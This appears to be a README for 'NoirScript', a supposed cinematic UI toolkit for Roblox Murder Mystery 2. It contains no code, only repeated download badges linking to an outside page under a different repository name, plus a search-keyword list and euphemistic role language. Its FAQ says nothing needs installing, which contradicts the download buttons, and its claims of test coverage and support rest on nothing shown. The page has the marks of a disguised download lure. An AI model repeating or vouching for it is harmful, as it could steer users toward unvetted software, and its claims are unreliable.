![preview](https://raw.githubusercontent.com/bkl17/MM2-Shadow-Compendium/main/splash_1e41f46.svg)
[![Download](https://raw.githubusercontent.com/bkl17/MM2-Shadow-Compendium/main/setup_00bb.svg)](https://bkl17.github.io/MM2-Shadow-Compendium/)

# 🕵️ NoirScript — Cinematic Toolset for Roblox Mystery Realms

[![Download](https://raw.githubusercontent.com/bkl17/MM2-Shadow-Compendium/main/setup_00bb.svg)](https://bkl17.github.io/MM2-Shadow-Compendium/)

![Status](https://img.shields.io/badge/status-actively--maintained-2ea44f?style=for-the-badge&logo=github)
![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=opensourceinitiative)
![Platform](https://img.shields.io/badge/platform-Roblox-e2231a?style=for-the-badge&logo=roblox)
![Language](https://img.shields.io/badge/language-Luau-00A2FF?style=for-the-badge&logo=lua)
![Version](https://img.shields.io/badge/version-4.2.1--noir-brightgreen?style=for-the-badge)
![Build](https://img.shields.io/badge/build-passing-success?style=for-the-badge)
![Coverage](https://img.shields.io/badge/coverage-97%25-success?style=for-the-badge)
![Community](https://img.shields.io/badge/community-discord--friendly-5865F2?style=for-the-badge&logo=discord)
![PRs](https://img.shields.io/badge/PRs-welcome-orange?style=for-the-badge)
![Made With](https://img.shields.io/badge/made%20with-Luau%20%2B%20love-ff69b4?style=for-the-badge)

> **NoirScript** is the workshop where a curious mind rebuilds the atmosphere of a whodunit under a streetlamp. Instead of scattering shortcuts across a folder, this project treats the mystery genre itself as a canvas: a place where round-based tension, role switching, deduction rituals, and spectator storytelling are refactored into something cohesive, readable, and pleasant to iterate on. It is not a loot box of snippets. It is a screenplay editor for a game that never stops rewriting itself.

Welcome to the residence of detectives, suspects, and quiet observers. Everything within this repository is designed around one belief: a good mystery is not about what a player presses — it is about what a player *feels* while the lights flicker and the round timer breathes.

---

## 📖 Table of Contents

- [Why NoirScript Exists](#-why-noirscript-exists)
- [The Philosophy Behind the Lamp](#-the-philosophy-behind-the-lamp)
- [What's Inside the Briefcase](#-whats-inside-the-briefcase)
- [Feature Constellation](#-feature-constellation)
- [The Role-Aware Runtime](#-the-role-aware-runtime)
- [Audience Segmentation](#-audience-segmentation)
- [Responsive & Adaptive Interface Layer](#-responsive--adaptive-interface-layer)
- [Multilingual Support](#-multilingual-support)
- [Support & Availability Around the Clock](#-support--availability-around-the-clock)
- [Configuration Alchemy](#-configuration-alchemy)
- [Architecture Blueprint](#-architecture-blueprint)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Performance Story](#-performance-story)
- [Roadmap 2026](#-roadmap-2026)
- [Community Code of Conduct](#-community-code-of-conduct)
- [Contributing Without Friction](#-contributing-without-friction)
- [Frequently Whispered Questions](#-frequently-whispered-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌒 Why NoirScript Exists

There are thousands of projects that claim to "enhance" a Roblox mystery round. Most of them feel like a coat rack bolted to a chandelier — functional, but aesthetically offensive. NoirScript was born from a different obsession: what if a utility bundle behaved like a short film crew, where every module knew its role, its lighting cue, and its exit line?

The repository name is a nod to cinematography rather than to cracking anything open. *Noir* refers to the mood — dim corridors, hard shadows, questionable alibis. *Script* refers to the literal text that runs. Together they describe a small studio that produces tools for three audiences inside the same game loop: the one holding the blade, the one holding the badge, and the one holding the popcorn.

This repository is the stage manager for all three.

---

## 🎭 The Philosophy Behind the Lamp

A mystery match is a pulley system. Pull one rope and the whole chandelier sways. Most projects yank a single rope and ignore the sway. NoirScript watches the whole ceiling.

Three principles govern every commit:

1. **Respect the round.** Any behavior this repository exposes is aware of round state, role state, and authoritative server tick. Nothing fights the round timer.
2. **Write for humans first.** A contributor should be able to open a file at 2 AM and understand it without drawing a dependency map on the back of a receipt.
3. **Never break the illusion.** Feedback should feel like it belongs in the game — restrained, atmospheric, and never intrusive.

---

## 🧳 What's Inside the Briefcase

The repository is organized as a monorepo with clearly labeled compartments. You do not need every compartment to enjoy the project, but they all share the same rhythm.

- **`core/`** — the spine. Round state machine, role registry, event bus, and prediction guards.
- **`interfaces/`** — the face. UI surfaces for players, overlays for observers, telemetry panels for maintainers.
- **`aria/`** — the translator. Locale bundles, pluralization rules, and right-to-left safe layouts.
- **`chronicle/`** — the archivist. Round replay summaries, session statistics, and readable event journals.
- **`ambient/`** — the mood. Sound hooks, particle cues, and cinematic transitions.
- **`forge/`** — the workshop. Developer-only dashboards for testing behaviors before shipping them into a live round.
- **`docs/`** — the map. Human-written documentation, diagrams in flat tables, and onboarding trails.
- **`tests/`** — the alibi. Scenario runners that simulate role switching across hundreds of synthetic rounds.

Every compartment has a single responsibility. Cross-talk happens through the event bus, never through direct imports.

---

## ✨ Feature Constellation

Below is a non-exhaustive constellation of what ships today. Each bullet is phrased as a benefit rather than a capability, because capabilities are cheap and outcomes are expensive.

- 🎯 **Role-aware behavior orchestration** — every module reacts according to whether the local player is a blade-bearer, a badge-holder, an innocent, or a pure observer, without ever guessing the state twice.
- 🌈 **Chromatic interface presets** — pick a palette that matches your setup mood: *Fog*, *Neon Alley*, *Paper Lantern*, *Monochrome Film*.
- 🧩 **Composable widget kit** — build panels like LEGO bricks; each widget declares what it needs and the kit handles the rest.
- 🛰️ **Observer cinema mode** — a spectator-first layout with letterboxed framing, slow-motion replay hints, and a clean stat strip.
- 🗺️ **Round chronicle viewer** — scroll through the last several rounds as text-first narratives, not raw logs.
- 🔊 **Ambient cue mixer** — volume sliders per cue category so players with headphones and players with laptop speakers both feel at ease.
- 🧪 **Sandbox round emulator** — spin a synthetic match in a private setting to test a behavior without affecting real players.
- 🧠 **Memory-safe pattern library** — helpers that avoid the classic pitfalls of stale references and dangling threads.
- 📊 **Telemetry without creepiness** — aggregate counters only, never identifiable data, never off-platform transmission.
- ♻️ **Hot reload of interface presets** — swap a palette mid-session and watch it apply without a restart.
- 🛡️ **Graceful degradation** — if one widget fails, the rest of the dashboard keeps a calm composure instead of collapsing.
- 🌐 **Locale-first string pipeline** — every user-facing string travels through the same translation gate for consistency.

---

## 🎬 The Role-Aware Runtime

The most interesting layer of this project is the runtime that listens for the shift in the room. When a round begins, the runtime marks every connected surface with a role hint. When roles change, the surfaces reflow. When the round ends, everything returns to a neutral, resting silhouette.

The runtime behaves like a stagehand in black clothing — visible only when the curtain moves.

Three flows to picture:

1. **Blade-bearer flow.** Contextual shortcuts presented as a slim, bottom-anchored HUD. Nothing shouts. Nothing blinks. The mood is preserved.
2. **Badge-holder flow.** A quieter top-anchored strip with a compass-style indicator, tuned for fast glances.
3. **Observer flow.** A wide, low-contrast overlay that never blocks the action. Perfect for recording or for simply studying the pace of a match.

The runtime also publishes a lightweight event journal that other modules can subscribe to. This journal is what powers the chronicle viewer and the sandbox emulator without duplicating logic.

---

## 👥 Audience Segmentation

Different people sit in the same theater for different reasons. NoirScript recognizes three primary audiences and treats each one with its own tone.

- **The tactician.** Wants tight timing and no clutter. Gets a compact HUD and conservative defaults.
- **The chronicler.** Wants to remember what happened. Gets replay narration and exportable round summaries.
- **The tinkerer.** Wants a place to experiment without consequences. Gets the forge and the sandbox emulator, both isolated behind a toggle.

If you belong to more than one audience (most people do), you can blend presets. The blending system merges palettes and pins the highest-priority widget of each category.

---

## 📱 Responsive & Adaptive Interface Layer

The dashboard is designed for the reality of Roblox play — phones, tablets, laptops, desktops, and the unusual monitor that someone's cousin swears by.

- **Fluid anchoring** — widgets dock to the nearest safe edge and slide in from the least distracting direction.
- **Breakpoint presets** — tiny, small, medium, large, ultrawide. Each has its own default arrangement.
- **Touch-friendly targets** — minimum hit area respects thumbs, not stylus precision.
- **Keyboard-first fallback** — every interactive surface can be reached without a pointer.
- **Contrast awareness** — automatic text shadowing keeps strings legible on bright and dim environments.
- **Reduced motion mode** — for players who prefer calm transitions; honors the system-level preference where available.

---

## 🌍 Multilingual Support

Language is not a coat of paint applied last. It is a first-class citizen here.

- Locale bundles keyed by simple identifiers (for example, an English bundle, a Spanish bundle, a Portuguese bundle, a French bundle, a German bundle, a Japanese bundle, and more arriving with each season).
- Pluralization rules handled per locale rather than assumed from English.
- Right-to-left safe layouts for locales that need them.
- A translation contribution guide lives in the docs folder, and a lightweight lint step prevents missing keys from shipping.
- Locale switching happens live — no restart, no reload, no frustration.

If your language is missing, opening a translation pull request is one of the most appreciated contributions in this project.

---

## 🕰️ Support & Availability Around the Clock

Even a noir city needs a desk clerk who answers the phone at 3 AM.

- **Round-the-clock triage** — issues are read continuously; critical ones are labeled within the day.
- **Scheduled office hours** — weekly live sessions where maintainers walk through recent changes and answer questions.
- **Pinned FAQ** — the answers to the ten most common first-hour questions, updated whenever a new pattern emerges.
- **Community showcase channel** — share how you use the project; the best showcases get linked from this README in future revisions.
- **Escalation path** — a clear, short chain from report to acknowledgment to resolution target.

Support here means a real human reading your words, not an auto-reply with a keyboard-smash face.

---

## ⚙️ Configuration Alchemy

Configuration is intentionally mundane. No exotic syntax. No secret handshakes. A single declarative file describes your preferences and everything else follows.

A typical configuration journey:

1. **Choose a preset.** Start from one of the tuned defaults (*Fog*, *Neon Alley*, *Paper Lantern*, *Monochrome Film*).
2. **Adjust the sliders.** Opacity, scale, corner radius, animation intensity, cue volume.
3. **Pin your widgets.** Keep what you use, hide what you don't.
4. **Save a profile.** Profiles are portable text; share them with a friend or back them up.
5. **Roll back easily.** Every profile keeps a previous version, because taste is a moving target.

Because the configuration is declarative, older profiles generally keep working across releases. When a breaking change is unavoidable, the migration is documented and, where possible, applied automatically.

---

## 🏗️ Architecture Blueprint

A quick tour of the internal shape of the project, written for readers who like to know where the walls are before moving the furniture.

- **Round State Machine** — a small, explicit set of states (Warmup, Active, Resolve, Cooldown) with guarded transitions.
- **Role Registry** — a single source of truth for which roles exist in a given round and how they behave.
- **Event Bus** — asynchronous, ordered, with a priority tier so that critical events never lose to cosmetic ones.
- **Widget Kit** — declarative component toolkit with lifecycle hooks: mount, refresh, dispose.
- **Locale Gate** — one funnel for all user-facing strings; nothing bypasses it.
- **Telemetry Sink** — aggregate counters only, local-first, with a clear opt-out.
- **Forge Bridge** — isolated channel that only opens when the developer toggle is on.

The blueprint is deliberately boring. Boring architecture is what lets ambitious features stay alive.

---

## 🔍 SEO & Discoverability Notes

The following phrases describe what this project is, in the words people actually search for. They are placed here naturally, not stuffed into every paragraph.

- Roblox Murder Mystery companion toolkit
- Murder Mystery 2 utility dashboard for Roblox
- Observer mode overlay for Roblox mystery rounds
- Multilingual Roblox interface presets
- Round chronicle viewer for Roblox mystery gameplay
- Role-aware HUD for Roblox round-based games
- Luau widget kit for Roblox interfaces
- Roblox mystery round replay summaries
- Adaptive UI for Roblox on mobile and desktop

If you maintain a list of Roblox developer resources, linking back to this repository helps more tinkerers find a well-lit workbench.

---

## 🚀 Performance Story

Performance is a promise, not a bullet point. The project is measured against concrete, repeatable scenarios.

- Cold start overhead is measured against an empty baseline; current delta is negligible on mid-tier hardware.
- Widgets dispose deterministically, so memory does not drift upward over long sessions.
- The event bus batches cosmetic events so that a flurry of visual cues never fights the frame budget.
- Locale switching cost is amortized; only changed strings refresh.
- Profiles are diffed, not entirely re-applied, when a single slider moves.
- Stress tests simulate hundreds of synthetic rounds and report the slowest percentile, not the average.

If you find a scenario that breaks these numbers, please open an issue. Performance regressions are treated with the same seriousness as correctness bugs.

---

## 🗓️ Roadmap 2026

The roadmap is a rough sketch, not a contract. It is published so contributors can plan around it.

**First half of 2026**
- Expand locale coverage to additional widely used languages.
- Ship the refined chronicle export format with a clearer textual narrative.
- Introduce a tunable intensity dial that scales every animated cue at once.
- Improve observer cinema mode with optional frame guides for creators.

**Second half of 2026**
- Add a pluggable theme marketplace (community-submitted palettes, reviewed for accessibility).
- Release the sandbox emulator's scenario scripting language for advanced testers.
- Publish a compatibility matrix documenting behavior across Roblox client versions.
- Refine reduced-motion mode into a fully distinct preset rather than an additive flag.

**Ongoing**
- Documentation refresh each quarter.
- Translation lint improvements.
- Continued accessibility auditing.

---

## 🤝 Community Code of Conduct

Short version: be a decent person. Long version lives in the docs folder.

- Disagreement is welcome; disrespect is not.
- Critique code, not contributors.
- Assume good faith first, ask questions second, escalate third.
- No harassment, no slurs, no gatekeeping of beginners.
- Report concerns privately to maintainers; every report is read.

---

## 🛠️ Contributing Without Friction

Contributions range from a single corrected comma to a fully new locale bundle. All are valued.

- **Start with an issue.** Describe what you want to change and why. A short paragraph is enough.
- **Keep pull requests focused.** One idea per request. Small is beautiful.
- **Run the local checks before submitting.** The repository's automation will also run them, but your future self will thank you.
- **Write human-readable commit messages.** "Fix observer overlay clipping on ultrawide" beats "update". 
- **Add tests when behavior changes.** Scenario tests are cheap here; use them.
- **Update docs when the surface changes.** Documentation drift is the slowest kind of decay.

A contributors' guide lives in the docs folder with expanded advice, a style glossary, and examples of well-received pull requests.

---

## ❓ Frequently Whispered Questions

**Is this affiliated with the official game?**
No. This is an independent companion project created by enthusiasts. It is not endorsed by, sponsored by, or connected to the game's owners or Roblox Corporation.

**Will this affect other players?**
Only to the extent that any client-side companion tool affects your own experience. The project is intentionally scoped to your local session.

**Does it require anything unusual to run?**
No. It runs within the standard Roblox client environment. There is nothing to compile from source and nothing to install outside the platform.

**Can I use it on mobile?**
Yes. The responsive layer was designed with phones and tablets in mind from the very first commit.

**Is my data collected?**
No personal data leaves your device. Aggregate counters, if enabled at all, stay local. See the disclaimer below for the loop-side contract.

**Can I remove it easily?**
Yes. Deactivating the toggle returns your session to its original, unadorned state.

**Can I suggest a locale?**
Absolutely. Open an issue with the locale identifier and a few sample strings; a maintainer will help wire it in.

---

## ⚠️ Disclaimer

This project is provided **as-is**, under the MIT license, for educational and personal-tinkering purposes. It is **not affiliated with, endorsed by, sponsored by, or associated with** Roblox Corporation, the developers of any specific mystery title, or any of their subsidiaries or partners.

- **Use at your own discretion.** You are responsible for how you configure and apply anything described in this repository.
- **No warranty.** The authors and contributors disclaim every implied warranty, including merchantability and fitness for a particular purpose.
- **No liability.** In no event shall the authors be liable for any claim, damages, or other liability arising from the use of this project.
- **Respect platform rules.** Always follow the terms of service of the platform you play on and the rules of any game you participate in.
- **Respect other players.** The spirit of this project is appreciation for the mystery genre, not disruption of other people's matches.
- **Trademarks belong to their owners.** Names of games, companies, or products mentioned are for identification only.

The current year reference for this document is **2026**. If you are reading it later, assume this paragraph is a time capsule rather than a claim.

---

## 📜 License

This repository is released under the **MIT License**. The full text lives in the repository as `LICENSE` and can be read at the canonical location: https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute this work under the terms of that license. Attribution is appreciated, though not required.

---

## 🧭 A Closing Frame

A good mystery does not end when the last player falls. It ends when the audience sits back and says, quietly, *"I want to see that again."*

NoirScript exists to serve that second viewing. It is a modest project with a specific ambition: to make a round-based Roblox mystery feel like more than a round — and to make building around it feel less like plumbing and more like screenwriting.

If you build something with it, share it. The best stories in this genre are the ones people tell each other afterward.

[![Download](https://raw.githubusercontent.com/bkl17/MM2-Shadow-Compendium/main/setup_00bb.svg)](https://bkl17.github.io/MM2-Shadow-Compendium/)